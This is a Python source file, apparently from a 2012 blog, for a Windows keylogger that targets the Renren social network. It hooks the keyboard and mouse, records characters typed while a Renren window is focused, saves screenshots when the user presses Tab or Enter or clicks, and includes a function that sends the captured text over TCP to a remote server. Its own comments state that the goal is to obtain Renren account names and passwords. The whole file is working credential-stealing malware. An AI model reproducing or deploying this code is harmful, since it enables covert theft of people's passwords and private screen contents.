#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pythoncom
import pyHook
import time
from PIL import ImageGrab
import socket


def send_msg_to_remote(msg):
    '''
    Function:向远程服务器发送信息
    Input：even
    Output: Ture
    author: dengyongkai
    blog:http://blog.sina.com.cn/kaiyongdeng
    date:2012-03-03
    '''
    host = '服务器的IP'
    port = 34586
    buf_size = 1024
    addr = (host, port)

    if len(msg) != 0:
        tcp_client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            tcp_client_sock.connect(addr)
        except IOError as e:
            print('Error:%s' % e.args[0])
            tcp_client_sock.close()

        data = time.strftime('[%Y-%m-%d %H:%M:%S]', time.localtime(time.time()))
        tip_info = data + 'from ' + socket.gethostname() + ':'
        tcp_client_sock.sendall(tip_info + msg)

        tcp_client_sock.close()


def onMouseEvent(event):
    '''
    Function:处理鼠标左键单击事件，如果当前MSG中存放了信息，
                                 将其写入文件，因为有的用户在输入 完用户名后，不是使用TAB键切换到密码
                                 框,而是通过鼠标切换到密码输入窗口这种情况应该属于大多数网民的习惯，
                                 所以此处要判断是否通过鼠标切换了输入窗口
    Input：even
    Output: Ture
    author: socrates
    date:2012-03-03
    '''
    global MSG
    if len(MSG) != 0:
        #send_msg_to_remote(MSG)
        MSG = ''
        # 屏幕抓图实现
        pic_name = time.strftime('%Y%m%d%H%M%S', time.localtime(time.time()))
        pic = ImageGrab.grab()
        pic.save('%s.png' % pic_name)
        # 保存成为以日期命名的图片
    return True


def onKeyboardEvent(event):
    "处理键盘事件"
    '''
    Function:处理键盘事件，如果当前窗口为renren页面，刚开始监控并记录用户输入
                                   因为此时用户可能准备输入用户名及密码进行登陆，所以将用户输入的所有可见
                                 的ascii字符记录下来，此处要考虑用户是否使用了TAB键或回车键来
                                结束输入，此时要将信息发送给远程服务器。
    Input：even
    Output: Ture
    author: socrates
    blog:http://sina.com.cn/kaiyongdeng
    date:2012-03-03
    '''
    global MSG
    if event.WindowName.decode('GBK').find(u"人人") != -1:
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)
        if (event.Ascii == 9) or (event.Ascii == 13):
            #send_msg_to_remote(MSG)
            MSG = ''
            # 屏幕抓图实现
            pic_name = time.strftime('%Y%m%d%H%M%S', time.localtime(time.time()))
            pic = ImageGrab.grab()
            # 保存成为以日期命名的图片
            pic.save('%s.png' % pic_name)

    return True


if __name__ == "__main__":
    '''
    Function:获取renren账号及密码，增加抓图功能
    Input：NONE
    Output: NONE
    author: socrates
    blog:http://sina.com.cn/kaiyongdeng
    date:2012-03-03
    '''
    MSG = ''

    # 创建hook句柄
    hm = pyHook.HookManager()

    # 监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()

    # 监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()

    # 循环获取消息
    pythoncom.PumpMessages()
